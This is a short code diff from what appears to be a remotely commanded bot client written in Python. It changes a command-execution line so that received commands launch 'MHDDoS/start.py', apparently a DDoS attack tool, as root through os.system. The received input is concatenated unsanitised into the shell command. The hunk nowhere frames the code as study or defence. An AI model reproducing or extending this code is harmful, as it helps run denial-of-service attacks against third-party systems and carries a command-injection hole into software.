@@ -29,7 +29,7 @@ while True:
             print("Module sent | " + last_command)
             successful_exec = last_command
             def exec_cmd():
-                os.system("./start " + execs)
+                os.system("sudo python3 MHDDoS/start.py " + execs)
             t = Process(target=exec_cmd(module=execs))
     elif "STOP_EXEC" in pe:
         try:
